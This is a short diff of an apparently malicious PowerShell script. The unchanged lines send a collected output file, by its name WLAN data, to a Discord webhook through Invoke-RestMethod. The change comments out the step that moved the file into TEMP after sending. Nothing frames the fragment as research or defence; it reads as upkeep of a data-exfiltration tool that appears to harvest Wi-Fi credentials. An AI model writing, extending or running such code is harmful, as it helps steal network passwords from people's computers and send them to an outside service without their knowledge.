@@ -172,10 +172,10 @@ if (Test-Path $outFile) {
         $response = Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $body -Headers $headers
         Write-DebugLog "Discord response: SUCCESS"
 
-        # ✅ MOVE ORIGINAL FILE TO TEMP (AFTER SUCCESSFUL SEND)
-        $tempFinalPath = "$env:TEMP\wlan_final_$(Get-Date -Format 'yyMMddHHmmss').txt"
-        Move-Item -Path $outFile -Destination $tempFinalPath -Force
-        Write-DebugLog "MOVED original file to: $tempFinalPath"
+        # # ✅ MOVE ORIGINAL FILE TO TEMP (AFTER SUCCESSFUL SEND)
+        # $tempFinalPath = "$env:TEMP\wlan_final_$(Get-Date -Format 'yyMMddHHmmss').txt"
+        # Move-Item -Path $outFile -Destination $tempFinalPath -Force
+        # Write-DebugLog "MOVED original file to: $tempFinalPath"
 
     } catch {
         Write-DebugLog "ERROR sending to Discord: $($_.Exception.Message)"
@@ -206,3 +206,4 @@ if ($DebugMode) {
     Write-Output "Window will stay open. Press any key to close..."
     $null = Read-Host
 }
+
